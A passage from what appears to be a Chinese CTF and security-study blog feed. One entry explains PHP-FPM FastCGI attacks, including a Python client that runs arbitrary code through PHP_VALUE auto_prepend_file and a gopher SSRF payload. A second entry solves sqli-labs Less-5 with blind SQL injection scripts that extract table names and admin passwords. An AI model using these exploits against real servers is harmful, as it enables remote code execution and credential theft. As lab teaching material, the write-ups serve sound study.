class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p><h1 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a>Nginx（IIS7）解析漏洞</h1><p>该漏洞的现象是</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/1.png"></p><p>1.txt/.php是一个不存在的文件，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了<code>fix_pathinfo</code>，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p><h1 id="fpm未授权访问"><a href="#fpm未授权访问" class="headerlink" title="fpm未授权访问"></a>fpm未授权访问</h1><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>此时，<code>SCRIPT_FILENAME</code>的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p><p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件。</p><p><strong>任意代码执行</strong></p><p>为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p><p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p><p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件<strong>之前</strong>，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件<strong>后</strong>，包含<code>auto_append_file</code>指向的文件。</p><p>那么就有趣了，假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p><p>那么，我们怎么设置<code>auto_prepend_file</code>的值？</p><p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。</p><p>所以，我们最后传入如下环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    </span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>兼容Python2和Python3，代码如下：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   <span class="comment">#参数，-p:端口号，默认是9000</span></span><br><span class="line">   <span class="comment">#-c 编码 默认&lt;?php phpinfo(); exit; ?&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">#没有默认值的必要参数  host       -f 已存在的php文件名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="php-fpm-attack"><a href="#php-fpm-attack" class="headerlink" title="php-fpm-attack"></a>php-fpm-attack</h2><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信，但这道题如果用默认的9000端口监听不能成功返回，但其实这道题在内网上还是有打开9000端口的，与外网端口号是一个映射的关系，所以这道题要加上外网的端口号。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/2.png"></p><h2 id="EZ-CURL"><a href="#EZ-CURL" class="headerlink" title="EZ-CURL"></a>EZ-CURL</h2><p>如果fpm不在外网开放，我们可以通过ssrf进行攻击(如果存在ssrf漏洞的地方)</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$c = curl_init();</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($c, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> curl_exec($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>a</code>参数是我们可以控制的，a可利用的协议有<code>gopher</code>、<code>dict</code>、<code>http</code>、<code>https</code>、<code>file</code>等<br><code>file</code>协议可以用于查看文件，<code>dict</code>协议可以用于刺探端口<br><code>gopher</code>协议支持<code>GET&amp;POST</code>请求，常用于攻击内网<code>ftp</code>、<code>redis</code>、<code>telnet</code>、<code>smtp</code>等服务</p><p>这道题我们利用的是gopher://协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>说明gopher协议可以直接发送tcp协议流，那么我们就可以把数据流urlencode编码构造ssrf攻击代码</p><p>我们发送tcp流给web server，会直接在页面显示出来返回的内容。</p><p>利用Gopherus来构造pyload。</p><p>需要传入一个参数 –exploit，我们这里是fastcgi</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/4.png"></p><p>接着输入我们知道的已存在的php文件，和执行的命令。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/5.png"></p><p>得出来的payload url解码如下（过滤不可见字符）</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/6.png"></p><p>生成的payload是经过一次url编码，但需要再urlencode编码一次,因为这里nginx解码一次,php-fpm解码一次。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/7.png"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/a3320315/article/details/102880329">https://blog.csdn.net/a3320315/article/details/102880329</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CGI,Fastcgi,PHP-FPM三者的联系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://zhuang-yongyi.gitee.io/yoyo/nep/fastcgi%E5%8D%8F%E8%AE%AE/3.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;CGI协议&quot;&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>细说sqli_labs Less-5</title>
    <link href="http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/"/>
    <id>http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/</id>
    <published>2021-02-26T02:22:23.823Z</published>
    <updated>2021-03-21T08:53:57.308Z</updated>
    
    <content type="html"><![CDATA[<p>前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。</p><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>用sqlmap判断注入类型，可以看到这道题有三种解题方法，分别是布尔盲注，报错注入，以及延时注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/1.png"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/2.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/3.png"></p><p>通过报错<code>&quot;1&quot;LIMIT 0,1&#39;</code>，可以推出我们输入的内容构成的查询语句为<code>&#39;1&quot;LIMIT 0,1</code>，可以看出id是用一对单引号闭合的，我们输入1‘导致报错。</p><h3 id="绕过报错"><a href="#绕过报错" class="headerlink" title="绕过报错"></a>绕过报错</h3><p>我们输入一个单引号与后面的一个单引号结合导致报错，猜想如果我们把后面的单引号注释掉就可以绕过报错。</p><p>查看mysql写注释的方法，有三种</p><ul><li>#</li><li>–+(–空格)</li><li>/**/    适用于多行注释</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag;#select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; </span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;-- select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;&#x2F;*select database();*&#x2F;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; select * from flag;&#x2F;*select database();*&#x2F;;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/4.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/5.png"></p><p>我们可以看到使用–空格可以绕过报错，而使用#不能绕过报错。我们打开burpsuit分析，可以发现#显示黑色，也就是说#没有成功进入url访问，导致无法绕过。但用#的url编码%23可以绕过。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/6.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/7.png"></p><h3 id="BurpSuite爆破"><a href="#BurpSuite爆破" class="headerlink" title="BurpSuite爆破"></a>BurpSuite爆破</h3><p>当我们输入的语句正确且我们判断正确时，会返回<code>You are in ...</code>的界面，当我们输入的语句正确且判断语句错误时会返回空白。据此，我们可以通过返回的页面来查看我们的判断语句是否正确。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/8.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/9.png"></p><p>这里先介绍几个函数的用法</p><p>substr()函数返回字符串的一小部分，substr(string,start,length)（length为1，即从第一个字母开始）</p><p>limit的使用格式为limitm,n，其中m是指记录开始的位置，n是指取几条记录。（第一条记录是从0开始）</p><p>ascii(str): str是一个字符串参数，返回值字符串的ascii码。</p><p>timeout：设定超时时间，秒为单位,在设定时间内没有返回内容则返回一个timeout异常</p><p>下面开始进行爆破，爆破的顺序是数据库名，表名，字段名，字段值。</p><p>爆破数据库的第一个字符，返回空白，即第一个字符不是a。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/10.png"></p><p>可以使用burpsuit的intruder模块对字符a进行爆破。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/11.png"></p><p>从这个例子可以看到，数据库的第一个字母为s，且mysql对字母大小写不敏感。但使用这种方法速度较低，我们可以直接爆破整个数据库名。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/12.png"></p><p>第一个爆破的数字为数字，设置为1到10；第二个爆破的数字为字符，字典为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&amp;*()-&#x3D;_;&#39;,.&#39;&lt;&gt;?&#96;~\|&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/13.png"></p><p>通过爆破我们可以简单看出，数据库名为secrity</p><p>使用这个方法较为简单，但是所花的时间相对较长，在ctf比赛中，该方法并不是为最优的，下面介绍使用脚本破解。</p><h3 id="简单脚本"><a href="#简单脚本" class="headerlink" title="简单脚本"></a>简单脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$Z%^&amp;*()\][;&#x27;.,/`·-=&#x27;]&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(database(),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        s=s+i</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">  <span class="comment">#database()=security</span></span><br></pre></td></tr></table></figure><p>爆破表名的url为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个表名 admin</span></span><br><span class="line"><span class="comment">#第二个表名 emails</span></span><br><span class="line"><span class="comment">#第三个表名 student</span></span><br><span class="line"><span class="comment">#第四个表名 uagents</span></span><br></pre></td></tr></table></figure><p>爆破字段名的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1),%d,1)=&#x27;%s&#x27;--+&quot;%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#admin 有三个字段名 id,username,password</span></span><br></pre></td></tr></table></figure><p>爆破字段值的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select id from admin limit 0,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        s=s+i</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="二分法脚本"><a href="#二分法脚本" class="headerlink" title="二分法脚本"></a>二分法脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 